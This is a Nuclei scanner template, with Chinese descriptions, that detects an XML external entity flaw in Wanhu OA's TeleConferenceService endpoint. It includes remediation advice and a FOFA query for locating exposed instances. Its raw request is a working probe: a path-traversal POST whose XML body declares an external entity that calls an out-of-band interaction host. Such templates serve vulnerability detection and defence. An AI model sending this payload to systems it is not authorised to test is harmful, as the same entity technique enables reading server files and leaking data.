id: wanhu-teleconferenceservice-xxe

info:
  name: Wanhu OA TeleConferenceService Interface - XML External Entity Injection
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 Wanhu OA TeleConferenceService Interface - XML External Entity Injection。该类漏洞通常源于 XML 解析器允许处理外部实体或 DTD，攻击者可借此触发文件读取或外带请求。模板会向 `/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能读取服务器本地文件、探测内网服务或通过外带通道泄露敏感数据。
    - 在部分解析器和业务场景下，XXE 还可能造成拒绝服务或作为进一步入侵链路的入口。
  remediation: |
    - 禁用 XML 解析器的外部实体、外部 DTD 和 XInclude 支持。
    - 升级存在缺陷的 XML 处理库，并对 XML 输入进行大小、结构和来源限制。
    - 限制应用服务器外联能力，排查异常 DNS、HTTP 或 LDAP 外带请求。
  reference:
    - http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20TeleConferenceService%20XXE注入漏洞.html
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  classification:
    cwe-id: CWE-611
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="万户网络-ezOFFICE"
  tags: wanhu,oa,xxe,vuln

http:
  - raw:
      - |
        POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService HTTP/1.1
        Host: {{Hostname}}

        <?xml version="1.0" encoding="UTF-8" ?>
        <!DOCTYPE ANY [
        <!ENTITY xxe SYSTEM "http://{{interactsh-url}}" >]>
        <value>&xxe;</value>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "<response>"
          - "<retcode>"
        condition: and

      - type: word
        part: header
        words:
          - "text/xml"
